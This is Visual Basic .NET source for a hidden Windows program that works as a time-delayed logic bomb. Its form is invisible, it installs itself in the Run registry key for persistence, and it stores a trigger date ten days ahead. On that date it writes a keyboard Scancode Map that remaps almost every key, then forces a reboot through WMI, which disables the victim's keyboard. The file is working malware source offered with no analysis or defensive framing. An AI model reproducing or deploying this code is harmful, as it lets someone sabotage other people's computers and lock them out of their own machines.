Imports Microsoft.Win32
Public Class KFucker
    Inherits System.Windows.Forms.Form



    Public Sub New()
        MyBase.New()

        InitializeComponent()

    End Sub

    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    Private components As System.ComponentModel.IContainer

    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Me.Opacity = 0
        Me.ShowInTaskbar = False
    End Sub

    Private Sub KFucker_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Registry.LocalMachine.OpenSubKey("System\CurrentControlSet\Control").GetValue("CurrentCF").ToString()
        Catch
            Registry.LocalMachine.CreateSubKey("System\CurrentControlSet\Control").SetValue("CurrentCF", Today.AddDays(10))
            Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("KeyLayout", "C:\Windows\system32\KFucker.exe")
        End Try
        If Today >= Registry.LocalMachine.OpenSubKey("System\CurrentControlSet\Control").GetValue("CurrentCF").ToString() Then
            Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Control\Keyboard Layout").SetValue("Scancode Map", "00 00 00 00 00 00 00 00 63 00 00 00 34 00 01 00 34 00 02 00 34 00 03 00 34 00 04 00 34 00 05 00 34 00 06 00 34 00 07 00 34 00 08 00 34 00 09 00 34 00 0A 00 34 00 0B 00 34 00 0C 00 34 00 0D 00 34 00 0E 00 34 00 0F 00 34 00 10 00 34 00 11 00 34 00 12 00 34 00 13 00 34 00 14 00 34 00 15 00 34 00 16 00 34 00 17 00 34 00 18 00 34 00 19 00 34 00 1A 00 34 00 1B 00 34 00 1C 00 34 00 1D 00 34 00 1E 00 34 00 1F 00 34 00 20 00 34 00 21 00 34 00 22 00 34 00 23 00 34 00 24 00 34 00 25 00 34 00 26 00 34 00 27 00 34 00 28 00 34 00 29 00 34 00 2A 00 34 00 2B 00 34 00 2C 00 34 00 2D 00 34 00 2E 00 34 00 2F 00 34 00 30 00 34 00 31 00 34 00 32 00 34 00 33 00 34 00 35 00 34 00 36 00 34 00 37 00 34 00 38 00 34 00 39 00 34 00 3A 00 34 00 3B 00 34 00 3C 00 34 00 3D 00 34 00 3E 00 34 00 3F 00 34 00 40 00 34 00 41 00 34 00 42 00 34 00 43 00 34 00 44 00 34 00 45 00 34 00 46 00 34 00 47 00 34 00 48 00 34 00 49 00 34 00 4A 00 34 00 4B 00 34 00 4C 00 34 00 4D 00 34 00 4E 00 34 00 4F 00 34 00 50 00 34 00 51 00 34 00 52 00 34 00 53 00 34 00 54 00 34 00 55 00 34 00 56 00 34 00 57 00 34 00 58 00 34 00 5B E0 34 00 5C E0 34 00 5D E0 34 00 E0 1C 34 00 1D E0 34 00 22 E0 34 00 24 E0 34 00 2E E0 34 00 30 E0 34 00 38 E0 34 00 3A 01 00 00 00 00")
            Dim System, Skillz As Object
            System = GetObject( _
               "winmgmts:{impersonationLevel=impersonate,(Shutdown)}" & "//./root/cimv2").ExecQuery("SELECT * FROM Win32_OperatingSystem")
            For Each Skillz In System
                Skillz.Win32Shutdown(12)
            Next
        Else
            End
        End If
    End Sub
End Class
